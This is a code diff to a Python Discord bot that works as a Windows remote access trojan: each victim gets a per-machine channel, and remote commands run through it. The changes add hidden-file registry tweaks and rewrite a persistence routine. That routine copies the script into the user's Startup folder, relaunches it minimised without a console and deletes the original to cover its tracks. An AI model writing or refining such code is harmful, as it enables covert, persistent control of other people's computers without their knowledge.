@@ -28,7 +28,7 @@ import io
 import os
 import re
 
-TOKEN = "Discord bot token" # Do not remove this string (easy compiler looks for this) - 23r98h
+TOKEN = "Discord bot token" # Do not remove or modify this string (easy compiler looks for this) - 23r98h
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -38,17 +38,15 @@ bot = commands.Bot(command_prefix='$', intents=intents)
 bot.remove_command('help')
 pyautogui.FAILSAFE = False
 
-config_path = os.path.join(os.path.expanduser("~"), 'AppData', 'Local', 'Microsoft', "Config")
-os.makedirs(config_path, exist_ok=True)
-
 def sanitize_channel_name(name):
     sanitized = re.sub(r'[^a-zA-Z0-9_-]', '', name).lower()
     return sanitized
 
 def bot_channel():
-    raw_channel_name = f"{os.environ.get("COMPUTERNAME", "UnknownDevice")}-{os.getlogin()}"
+    raw_channel_name = f"{os.environ.get('COMPUTERNAME', 'UnknownDevice')}-{os.getlogin()}"
     channel_name = sanitize_channel_name(raw_channel_name)
     return channel_name
+
 
 @bot.command(help="Delete and recreates bots channel, wiping all the messages")
 async def init(ctx):
@@ -758,7 +756,7 @@ async def commands(ctx, page: int = 1):
         except asyncio.TimeoutError:
             break
 
-@bot.command(help="Hides the script file and disables show hidden files.")
+@bot.command(help="Hides the script file and disables show hidden files (windows doesn't allow autostarting hidden files so be carefull).")
 async def hidescript(ctx):
     try:
         reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
@@ -770,30 +768,50 @@ async def hidescript(ctx):
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
         
-@bot.command(help="Makes this script execute on logon (only user that ran this file).")
+@bot.command(help="Makes this script execute on logon (only user that ran this file, startup programs dont start if hidden, hence the now seperate command).")
 async def startup(ctx):
     try:
-        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(reg_key, "Hidden", 0, winreg.REG_DWORD, 2)
-        winreg.SetValueEx(reg_key, "ShowSuperHidden", 0, winreg.REG_DWORD, 0)
-        winreg.CloseKey(reg_key)
+        ## Modify registry to show hidden files and folders
+        #reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
+        #winreg.SetValueEx(reg_key, "Hidden", 0, winreg.REG_DWORD, 2)
+        #winreg.SetValueEx(reg_key, "ShowSuperHidden", 0, winreg.REG_DWORD, 0)
+        #winreg.CloseKey(reg_key)
         
-        script_path = sys.executable
-        startup_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', "Programs", "Startup")
-    
-        if os.path.exists(startup_folder):
-            script_name = os.path.basename(script_path)
-    
-            destination_path = os.path.join(startup_folder, script_name)
-    
-            shutil.copy(script_path, destination_path)
-    
-            print(f"Script '{script_name}' moved to the startup folder.")
-            await ctx.send(f"Moved '{script_name}' to the startup folder.")
+        # Determine script path
+        if os.path.basename(sys.executable).lower() == "python.exe":
+            script_path = __file__  # Use __file__ if running from Python interpreter
         else:
-            await ctx.send(f"Startup folder \"{startup_folder}\" not found.")
+            script_path = sys.executable  # Use sys.executable if running from compiled executable
         
-        os.system(f'attrib +h "{destination_path}"')
+        # Copy script to startup folder
+        startup_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    
+        if not os.path.exists(startup_folder):
+            os.makedirs(startup_folder)
+        
+        script_name = os.path.basename(script_path)
+        destination_path = os.path.join(startup_folder, script_name)
+    
+        shutil.copy(script_path, destination_path)
+    
+        print(f"Script '{script_name}' moved to the startup folder.")
+        await ctx.send(f"Moved '{script_name}' to the startup folder.")
+        
+        # Make the copied script hidden
+        #os.system(f'attrib +h "{destination_path}"')
+        
+        # Prepare the command to start the script from the startup folder without console window
+        if script_path.endswith('.py') or script_path.endswith('.pyw'):
+            startup_command = f'cmd /C start /MIN pythonw "{destination_path}" & del "{script_path}"'
+        else:
+            startup_command = f'start /MIN "" "{destination_path}" & del "{script_path}"'
+        
+        # Start the script from the startup folder without waiting for it to finish
+        subprocess.Popen(startup_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        
+        # Notify and exit gracefully
+        await ctx.send("Script started on startup successfully.")
+        sys.exit()
 
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
